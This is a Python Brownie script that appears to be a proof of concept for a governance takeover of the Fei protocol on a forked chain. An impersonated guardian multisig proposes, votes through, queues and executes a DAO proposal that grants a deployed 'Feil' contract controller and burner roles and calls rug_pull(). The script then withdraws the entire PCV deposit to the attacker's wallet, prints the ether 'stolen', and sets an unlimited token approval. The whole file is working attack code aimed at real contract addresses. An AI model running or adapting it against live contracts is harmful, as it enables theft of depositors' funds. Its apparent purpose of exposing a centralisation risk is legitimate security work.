from brownie import Contract, accounts, history, chain, Feil
from tqdm import trange
from enum import IntEnum


class ProposalState(IntEnum):
    Pending = 0
    Active = 1
    Canceled = 2
    Defeated = 3
    Succeeded = 4
    Queued = 5
    Expired = 6
    Executed = 7


def wait_for_block(n, step=10):
    for i in trange(chain.height, n, step):
        chain.mine(step)


def main():
    feil = Feil.deploy({"from": accounts[0]})

    # we will only require a 2 of 3 `guardian` multisig controlled by the team
    rugman = accounts.at("0xB8f482539F2d3Ae2C9ea6076894df36D1f632775", force=True)
    dao = Contract("0xE087F94c3081e1832dC7a22B48c6f2b5fAaE579B")
    core = Contract("0x8d5ED43dCa8C2F7dFB20CF7b53CC7E593635d7b9")
    pcv_deposit = Contract("0x9b0C6299D08fe823f2C0598d97A1141507e4ad86")
    fei = Contract("0x956F47F50A910163D8BF957Cf5846D573E7f87CA")

    # propose granting `pcv controller` role to rugman
    tx = dao.propose(
        [core, core, feil],
        [0, 0, 0],
        ["grantRole(bytes32,address)", "grantRole(bytes32,address)", "rug_pull()"],
        [
            "0x" + core.grantRole.encode_input(core.PCV_CONTROLLER_ROLE(), feil)[10:],
            "0x" + core.grantRole.encode_input(core.BURNER_ROLE(), feil)[10:],
            "0x",
        ],
        "rug fei",
        {"from": rugman},
    )
    tx.info()
    proposal = tx.events["ProposalCreated"]

    # conveniently `guardian` has enough votes to pass it
    wait_for_block(proposal["startBlock"])
    dao.castVote(proposal["id"], True, {"from": rugman})

    # queue into timelock
    wait_for_block(proposal["endBlock"])
    tx = dao.queue(proposal["id"], {"from": rugman})
    queued = tx.events["ProposalQueued"]

    # execute the proposal
    chain.sleep(queued["eta"] - chain.time() + 60)
    tx = dao.execute(proposal["id"], {"from": rugman})
    tx.info()

    # migrate pcv to our wallet
    print(f"fei supply: {fei.totalSupply() / 1e18}")
    pcv_deposit.withdraw(rugman, pcv_deposit.totalValue(), {"from": rugman})
    print(f"stolen {rugman.balance() / 1e18} ether")
    print(f"remaining pcv {pcv_deposit.totalValue() / 1e18} ether")

    print(f"fei supply: {fei.totalSupply() / 1e18}")

    fei_holder = accounts.at('0xaeD7384F03844Af886b830862FF0a7AFce0a632C')
    fei.approve(feil, 2**256-1, {'from': fei_holder})
